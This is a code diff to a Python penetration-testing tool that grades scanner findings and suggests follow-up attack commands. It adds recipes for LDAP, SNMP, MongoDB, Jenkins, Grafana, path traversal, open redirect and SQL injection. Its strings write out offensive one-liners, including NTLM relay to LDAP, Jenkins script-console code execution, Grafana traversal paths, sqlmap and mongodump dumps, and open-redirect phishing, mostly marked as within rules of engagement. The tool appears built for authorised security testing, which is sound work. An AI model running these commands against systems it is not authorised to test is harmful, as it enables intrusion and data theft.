@@ -162,7 +162,11 @@ def _v_smbghost(host, port, vuln):
 
 def _v_potato(host, port, vuln):
     held = _local(host, r"seimpersonate|seassignprimarytoken")
-    if held and re.search(r"enabled", held, re.I):
+    # Require an affirmative "Enabled" - NOT the bare substring, which also lives in
+    # "not enabled" / "enabled: false" and would false-CONFIRM a disabled privilege.
+    negated = held and re.search(
+        r"\bdisabled\b|not\s+enabled|enabled\s*[:=]\s*(?:false|no|0|off)", held, re.I)
+    if held and re.search(r"\benabled\b", held, re.I) and not negated:
         return CONFIRMED, [f"On-target enum confirms the privilege is ENABLED: {held}",
                            "GodPotato / PrintSpoofer / JuicyPotatoNG work on current patched Win10/11 & "
                            "Server 2016-2022 (they abuse SeImpersonate, not a patchable bug) -> real path to SYSTEM."]
@@ -187,7 +191,15 @@ def _v_smb_writable(host, port, vuln):
 
 
 def _v_nullsession(host, port, vuln):
-    if _nse_vulnerable(vuln) or re.search(r"logged in|shares|allows sessions", vuln.output or "", re.I):
+    # Require an explicit ANONYMOUS/null marker - the old "shares"/"logged in" match
+    # also fired on a CREDENTIALED smb-enum-shares listing (recce supports --creds),
+    # falsely adjudicating an authenticated enum as an anonymous session. nmap prints
+    # "account_used: <blank>" (or guest) precisely when the session was anonymous.
+    out = vuln.output or ""
+    anon = re.search(r"account_used:\s*(?:<blank>|''|\"\"|guest|anonymous)"
+                     r"|null session|anonymous (?:login|access)|unauthenticated",
+                     out, re.I)
+    if _nse_vulnerable(vuln) or anon:
         return CONFIRMED, ["The check actually established an anonymous/null session (it enumerated without "
                            "credentials) -> CONFIRMED."]
     return LIKELY, ["Prove directly: nxc smb <ip> -u '' -p '' --shares   (or enum4linux-ng -A <ip>). "
@@ -229,6 +241,80 @@ def _v_docker_api(host, port, vuln):
         "create a container itself - the successful unauthenticated read is the proof.",
         "FP only if the port actually enforces mutual-TLS (2376 --tlsverify) and the "
         "read was rejected - in which case recce would not have raised this."]
+
+
+def _v_ldap(host, port, vuln):
+    # recce performed the anonymous bind / anonymous read / cleartext bind itself, so
+    # each is directly observed -> CONFIRMED, with the matching escalation.
+    b = _blob(vuln)
+    if "directory read" in b:
+        return CONFIRMED, [
+            "recce bound to LDAP anonymously and the naming context returned attributes "
+            "- an unauthenticated client can read directory objects (directly observed).",
+            "Enumerate the disclosed directory: ldapsearch -x -H ldap://<ip> -b <base> "
+            "'(objectClass=user)' sAMAccountName servicePrincipalName description  "
+            "(SPNs = kerberoast targets; descriptions frequently hold passwords).",
+            "FP only if the read was actually denied - recce would not have raised this."]
+    if "cleartext" in b:
+        return CONFIRMED, [
+            "recce completed a simple bind on cleartext 389 - a real credentialed bind "
+            "here crosses the wire unencrypted, and the missing transport protection is "
+            "an NTLM->LDAP relay surface (directly observed).",
+            "Sniff a real bind (tcpdump 'tcp port 389'), or relay coerced auth: "
+            "ntlmrelayx.py -t ldap://<ip> --escalate-user <user>  (within ROE).",
+            "Require LDAPS/StartTLS + LDAP signing and channel binding."]
+    return CONFIRMED, [
+        "recce performed an anonymous simple bind (empty credentials) and the server "
+        "returned success - it hands out an anonymous LDAP session (directly observed).",
+        "Pivot to reading the directory: ldapsearch -x -H ldap://<ip> -b <base> "
+        "'(objectClass=*)'; pair with nxc ldap <ip> -u '' -p '' --users.",
+        "FP only if the bind was actually refused - recce would not have raised this."]
+
+
+def _v_snmp(host, port, vuln):
+    # recce guessed the community and read data back over the wire (or walked the
+    # LanMgr user table), so the disclosure is directly observed -> CONFIRMED.
+    b = _blob(vuln)
+    if "user account" in b:
+        return CONFIRMED, [
+            "recce walked the LanManager user MIB (1.3.6.1.4.1.77.1.2.25) and the agent "
+            "returned account names - an unauthenticated spray list (directly observed).",
+            "Re-read them and pivot to a spray: snmp-check <ip> -c <community>; then "
+            "nxc smb <ip> -u users.txt -p passwords.txt.",
+            "FP only if the walk returned nothing - recce would not have raised this."]
+    if "process / software" in b:
+        return CONFIRMED, [
+            "recce walked the host-resources MIB and the agent returned running "
+            "processes / installed software unauthenticated (directly observed).",
+            "snmpwalk -v2c -c <community> <ip> 1.3.6.1.2.1.25.6.3.1.2 (installed "
+            "software); mine for AV/EDR and unpatched builds.",
+            "FP only if the walk returned nothing - recce would not have raised this."]
+    return CONFIRMED, [
+        "recce guessed the community string and the agent answered with SNMP data "
+        "unauthenticated (directly observed, not a banner guess).",
+        "snmpwalk -v2c -c <community> <ip>  (or snmp-check <ip> -c <community>) to dump "
+        "the full tree; a read-WRITE community (verify - recce did NOT send a SET) lets "
+        "you push configuration.",
+        "FP only if the community was actually refused - recce would not have raised this."]
+
+
+def _v_mongodb(host, port, vuln):
+    # recce spoke the wire protocol and listDatabases returned the database list with
+    # no credential, so the no-auth exposure is directly observed -> CONFIRMED.
+    b = _blob(vuln)
+    if "end-of-life" in b or "legacy" in b:
+        return CONFIRMED, [
+            "recce read the running MongoDB version via buildInfo and it is past "
+            "end-of-life (directly observed).",
+            "mongosh mongodb://<ip>:<port>/ --eval 'db.version()' to re-read; check the "
+            "release against the support matrix.",
+            "FP only if a vendor backported fixes to this build in place."]
+    return CONFIRMED, [
+        "recce sent listDatabases over the MongoDB wire protocol with no authentication "
+        "and the server returned the database list (directly observed).",
+        "Dump it: mongosh mongodb://<ip>:<port>/ --eval 'db.adminCommand({listDatabases:1})' "
+        "then mongodump --host <ip> --port <port> --out loot/  (read/write in ROE).",
+        "FP only if the server actually required auth (it would have returned an error)."]
 
 
 def _v_ftp_backdoor(host, port, vuln):
@@ -358,6 +444,97 @@ def _v_web_exposure(host, port, vuln):
                        "(whatweb / nikto / nuclei). For .git, dump it: git-dumper <url>/.git ./loot."]
 
 
+def _v_web_app(host, port, vuln):
+    # Tier-1 niche-app exposures: recce fetched/authenticated the endpoint itself, so
+    # each is directly observed -> CONFIRMED, with the app-specific escalation.
+    t = (vuln.title or "").lower()
+    if "jenkins script console" in t:
+        return CONFIRMED, [
+            "recce reached the Jenkins Groovy script console on an unauthenticated GET "
+            "(the console form came back) - that IS arbitrary code execution as the "
+            "Jenkins process.",
+            "RCE within ROE: curl <url>/scriptText --data-urlencode "
+            "'script=println \"id\".execute().text'  (or use the web console)."]
+    if "grafana" in t and ("traversal" in t or "file read" in t):
+        return CONFIRMED, [
+            "recce read /etc/passwd through the Grafana plugin path traversal "
+            "(CVE-2021-43798) - the response carried the root:...:0:0: line.",
+            "Read app secrets next: /public/plugins/<plugin>/../../.../conf/defaults.ini "
+            "and the Grafana DB for admin hashes / datasource creds (within ROE)."]
+    if "elasticsearch readable" in t:
+        return CONFIRMED, [
+            "recce listed Elasticsearch indices with no credential - the cluster serves "
+            "reads unauthenticated.",
+            "Dump it: curl <url>/_search?size=100 ; enumerate indices for PII/secrets."]
+    if "keycloak admin console" in t:
+        return CONFIRMED, [
+            "recce reached the Keycloak admin console unauthenticated (the console app "
+            "loaded) - identity for every federated app sits behind it.",
+            "Try default admin/admin at the console; a working login = realm/user takeover."]
+    if "vault" in t:
+        return CONFIRMED, [
+            "recce read the Vault seal-status API unauthenticated (version + sealed state "
+            "returned) - the API is network-reachable.",
+            "If it is dev-mode / a token leaks, read every secret (vault kv get ...); "
+            "otherwise this is version + exposure recon (match the version to CVEs)."]
+    if "kibana" in t:
+        return CONFIRMED, [
+            "recce read the Kibana status/version endpoint - the version maps to known "
+            "CVEs (several prototype-pollution -> RCE chains).",
+            "Match it: searchsploit kibana <version>; pivot to the ES cluster behind it."]
+    if "default" in t and "credential" in t:
+        return CONFIRMED, [
+            "recce authenticated with a documented default credential (the login request "
+            "returned an authenticated session/cookie) - directly observed.",
+            "Log in with the same creds and pivot: admin of this app is usually a foothold "
+            "to secrets / RCE (pipelines, datasources, object storage, realms)."]
+    return CONFIRMED, ["recce observed this exposure directly (see the finding output)."]
+
+
+def _v_lfi(host, port, vuln):
+    return CONFIRMED, [
+        "recce injected a traversal sequence and the response came back with the target "
+        "file's contents (root:...:0:0: for /etc/passwd, or a win.ini section) - the app "
+        "builds a file path from our input (directly observed).",
+        "Read app secrets next within ROE: config/.env, source files, cloud-cred files, "
+        "or /proc/self/environ; a PHP wrapper (php://filter) often escalates to code.",
+        "FP only if the file content was static page text - recce matched the file's own "
+        "signature, so that's unlikely."]
+
+
+def _v_open_redirect(host, port, vuln):
+    return CONFIRMED, [
+        "recce set the parameter to an attacker host and the server answered a 3xx whose "
+        "Location pointed at that host (directly observed - the redirect target is "
+        "attacker-controlled).",
+        "Weaponise within ROE: use it for phishing landing pages, or to smuggle a token/"
+        "code through an OAuth redirect_uri where the app trusts this endpoint.",
+        "FP only if the app hard-limits the final destination despite the reflected "
+        "Location (rare) - judge business impact, not existence."]
+
+
+def _v_sqli(host, port, vuln):
+    # recce injected SQL and observed the database respond (an error, a boolean
+    # differential, or a controlled time delay) - a direct observation -> CONFIRMED.
+    t = (vuln.title or "").lower()
+    if "error-based" in t:
+        how = ("a database error surfaced the moment recce broke out of the quote - the "
+               "app concatenates our input into the query")
+    elif "time-based" in t:
+        how = ("recce's sleep payload delayed the response and the delay scaled with the "
+               "sleep argument - our injected SQL controls execution")
+    else:
+        how = ("a TRUE condition returned the baseline page and a FALSE one returned a "
+               "different page, reproducibly - the app evaluates our injected boolean")
+    return CONFIRMED, [
+        f"recce actively confirmed the injection: {how} (directly observed).",
+        "Weaponise within ROE with sqlmap, pre-filled: sqlmap -u '<url>' "
+        "-p '<param>' --batch --dbs   (add --data for POST forms); then --dump the "
+        "interesting tables.",
+        "FP only if the differential/error was environmental - recce re-tested to rule "
+        "that out before raising this."]
+
+
 def _v_ssti(host, port, vuln):
     return CONFIRMED, ["recce injected a template expression and the engine evaluated it (7*7 -> 49 "
                        "next to our canary) - that IS code execution in the template context, "
@@ -461,7 +638,10 @@ def _v_openssh_regresshion(host, port, vuln):
     prod, ver = _pv(host, vuln)
     if not ver or "openssh" not in (prod or "").lower() and "openssh" not in _blob(vuln):
         return INCONCLUSIVE, ["No OpenSSH version captured; grab the banner: nc <ip> 22."]
-    if _cmp(ver, "9.8p1") >= 0:
+    # A bare "9.8" (non-portable/OpenBSD, no pN suffix) is the fixed release too, but
+    # sorts BELOW "9.8p1" in _cmp - so match it explicitly or it falls to a false LIKELY.
+    fixed = _cmp(ver, "9.8p1") >= 0 or ("p" not in ver.lower() and _cmp(ver, "9.8") >= 0)
+    if fixed:
         return FALSE_POSITIVE, [
             f"OpenSSH {ver} is >= 9.8p1, the release that FIXES regreSSHion -> not "
             "vulnerable. Dismiss (this is a common over-flag)."]
@@ -573,6 +753,48 @@ _RECIPES: list[dict] = [
                "/host sh  (root shell on the host - ROE); recce only READ the API to prove it.",
      "fp": "The port enforces mutual-TLS (2376 --tlsverify) and rejected the read.",
      "fn": _v_docker_api},
+    {"id": "ldap-anon-read",
+     "match": r"anonymous ldap directory read|anonymous.*directory read",
+     "name": "Anonymous LDAP directory read (unauthenticated disclosure)",
+     "pre": ["LDAP reachable", "Anonymous bind accepted", "Naming context readable anonymously"],
+     "finish": "ldapsearch -x -H ldap://<ip> -b <base> '(objectClass=user)' "
+               "sAMAccountName servicePrincipalName description  (recce already read it).",
+     "fp": "The anonymous read was actually denied (recce would not have raised this).",
+     "fn": _v_ldap},
+    {"id": "ldap-cleartext",
+     "match": r"ldap over cleartext|cleartext.{0,6}ldap|ldap.{0,12}no tls",
+     "name": "Cleartext LDAP (no TLS on 389) - sniff / relay surface",
+     "pre": ["LDAP simple bind accepted on cleartext 389", "No LDAPS/StartTLS enforced"],
+     "finish": "relay coerced NTLM auth to LDAP: ntlmrelayx.py -t ldap://<ip> "
+               "--escalate-user <user>; or sniff a real bind (tcpdump 'tcp port 389').",
+     "fp": "The server actually enforces LDAPS/StartTLS + signing (bind would be refused).",
+     "fn": _v_ldap},
+    {"id": "ldap-anon-bind",
+     "match": r"anonymous ldap bind",
+     "name": "Anonymous LDAP bind allowed",
+     "pre": ["LDAP reachable", "Simple bind with empty credentials accepted"],
+     "finish": "ldapsearch -x -H ldap://<ip> -b '' -s base '(objectClass=*)', then try "
+               "-b the naming context; nxc ldap <ip> -u '' -p '' --users.",
+     "fp": "The anonymous bind was actually refused (recce would not have raised this).",
+     "fn": _v_ldap},
+    {"id": "snmp-community",
+     "match": r"snmp readable with a guessable community|guessable community string|"
+              r"snmp exposes local user|snmp exposes process",
+     "name": "SNMP readable with a guessable community string",
+     "pre": ["SNMP (161/udp) reachable", "A default/guessable community string is accepted"],
+     "finish": "snmpwalk -v2c -c <community> <ip>  (or snmp-check <ip> -c <community>) - "
+               "recce already read data back to prove it.",
+     "fp": "The community was actually refused (recce would not have raised this).",
+     "fn": _v_snmp},
+    {"id": "mongodb-unauth",
+     "match": r"mongodb exposed without authentication|mongodb.*(no auth|unauth)|"
+              r"mongodb end-of-life|mongodb.*legacy build",
+     "name": "MongoDB exposed without authentication",
+     "pre": ["MongoDB (27017-27019) reachable", "listDatabases answered with no credential"],
+     "finish": "mongosh mongodb://<ip>:<port>/ --eval 'db.adminCommand({listDatabases:1})' "
+               "then mongodump --host <ip> --port <port> --out loot/  (recce already read it).",
+     "fp": "The server actually enforced auth and returned an error.",
+     "fn": _v_mongodb},
     {"id": "ftp-backdoor",
      "match": r"vsftpd 2\.3\.4|proftpd.*backdoor|ftp.*backdoor|mod_copy|cve-2015-3306",
      "name": "Backdoored / RCE FTP build",
@@ -647,6 +869,17 @@ _RECIPES: list[dict] = [
      "finish": "impacket-GetNPUsers <dom>/ -usersfile <users> -no-pass  ->  hashcat -m 18200.",
      "fp": "Existence is confirmed by the query; the only question is whether the hash cracks.",
      "fn": _v_asrep},
+    {"id": "web-app-unauth",
+     "match": r"jenkins script console|keycloak admin console|grafana.*(traversal|file read)|"
+              r"elasticsearch readable|vault reachable|kibana status endpoint|"
+              r"default [\w /]*credential",
+     "name": "Exposed application (unauthenticated access / default credentials)",
+     "pre": ["The application endpoint is reachable",
+             "No authentication enforced, or a documented default credential was accepted"],
+     "finish": "Log in / re-read with the command in the finding, then pivot per the "
+               "evidence (RCE, file read, data dump, or account takeover).",
+     "fp": "The endpoint actually required valid credentials (recce would not have raised it).",
+     "fn": _v_web_app},
     {"id": "web-exposure", "match": r"exposed (git|\.git|svn|\.env|\.svn|\.ds_store|aws|backup)|"
                                     r"\.env file|\.git/config|mod_status exposed|mod_info exposed|"
                                     r"actuator|heapdump|gateway actuator|backup/source file|phpinfo|"
@@ -661,6 +894,32 @@ _RECIPES: list[dict] = [
      "fp": "It's an observation - the probe already fetched it. The only nuance is whether the exposed "
            "content is actually sensitive.",
      "fn": _v_web_exposure},
+    {"id": "web-lfi",
+     "match": r"path traversal / local file read|local file (read|inclusion)|\blfi\b",
+     "name": "Path traversal / local file read",
+     "pre": ["A parameter names a file/path", "recce read a system file's contents back"],
+     "finish": "curl --path-as-is '<url>?<param>=../../../../etc/passwd' to re-read; then "
+               "pull app secrets / source (recce already proved the read).",
+     "fp": "The returned content was static page text (recce matched the file's own signature).",
+     "fn": _v_lfi},
+    {"id": "web-openredirect",
+     "match": r"open redirect via ",
+     "name": "Open redirect",
+     "pre": ["A parameter is reflected into the redirect target",
+             "recce observed a 3xx Location pointing at an attacker host"],
+     "finish": "re-issue the request with the param set to your host; use for phishing / "
+               "OAuth token smuggling within ROE.",
+     "fp": "The app hard-limits the final destination despite the reflected Location (rare).",
+     "fn": _v_open_redirect},
+    {"id": "web-sqli",
+     "match": r"sql injection in |\bsqli\b|error-based, (mysql|postgresql|mssql|oracle|sqlite)",
+     "name": "SQL injection",
+     "pre": ["A parameter/field reaches a SQL query unsanitised",
+             "recce observed the database respond to injected SQL"],
+     "finish": "sqlmap -u '<url>' -p '<param>' --batch --dbs  (add --data for POST), then "
+               "--dump the sensitive tables - recce already proved the injection.",
+     "fp": "The error/differential/delay was environmental (recce re-tested to exclude that).",
+     "fn": _v_sqli},
     {"id": "web-ssti", "match": r"server-side template injection|\bssti\b|template engine (executed|evaluated)",
      "name": "Server-Side Template Injection (SSTI)",
      "pre": ["User input is rendered by a server-side template engine"],
@@ -711,7 +970,7 @@ _RECIPES: list[dict] = [
      "fn": _v_version_cve},
     {"id": "apache-httpd-version-cve",
      "match": r"apache (httpd|2\.4).{0,50}(smuggl|ssrf|mod_proxy|mod_lua|traversal|"
-              r"cve-2021-4177|cve-2022-2)",
+              r"cve-2021-41773|cve-2021-42013|cve-2022-2\d{4})",
      "name": "Apache httpd version-based CVE",
      "pre": ["Apache httpd version in the affected range"],
      "finish": "for path traversal (2.4.49/50): curl --path-as-is <url>/cgi-bin/.%2e/.%2e/"
@@ -734,7 +993,11 @@ _RECIPES: list[dict] = [
      "fp": "A patched 5.5.x (>= 5.5.63) or a MariaDB build mis-detected as MySQL 5.5.",
      "fn": _v_version_cve},
     {"id": "eol-service",
-     "match": r"end-of-life|end of life|\beol\b|\blegacy\b|unsupported|no longer supported",
+     # Only a PURE end-of-life note - if the same finding also names an RCE or a CVE
+     # (e.g. "Legacy Samba 3.x - multiple RCE"), don't swallow it here with "just
+     # upgrade"; let it fall through to a version-CVE verdict that keeps it actionable.
+     "match": r"^(?!.*(?:\brce\b|remote code|cve-\d)).*?"
+              r"(?:end-of-life|end of life|\beol\b|\blegacy\b|unsupported|no longer supported)",
      "name": "End-of-life / unsupported software exposed",
      "pre": ["The running build's branch is out of vendor support"],
      "finish": "confirm the exact build (nmap -sV) and check it against the vendor's "
@@ -756,6 +1019,18 @@ _RECIPES: list[dict] = [
                "or run the ProxyLogon/ProxyShell checker in check-only mode.",
      "fp": "A fully-patched Exchange that resists the checks.",
      "fn": _v_exchange},
+    # Catch-all, LAST so every specific recipe wins first: any remaining finding that
+    # names a CVE or RCE (SambaCry, Ghostcat, Drupalgeddon, appliance CVEs, ...) still
+    # gets an honest version-based verdict instead of silently having NO Verification row.
+    {"id": "version-cve-generic",
+     "match": r"cve-\d{4}-\d+|remote code execution|\brce\b|pre-?auth\w* (?:rce|bypass)",
+     "name": "Version-based CVE (offline DB match)",
+     "pre": ["The observed product/version falls in the CVE's affected range",
+             "the distro has not backported the fix"],
+     "finish": "map the exact build to the CVE's fixed version (vendor advisory / distro "
+               "changelog), then run the CVE's published check/PoC within a lab / ROE.",
+     "fp": "A backported or patched build that resists the check, or a version mis-detection.",
+     "fn": _v_version_cve},
 ]
 _COMPILED = [(re.compile(r["match"], re.I), r) for r in _RECIPES]
 
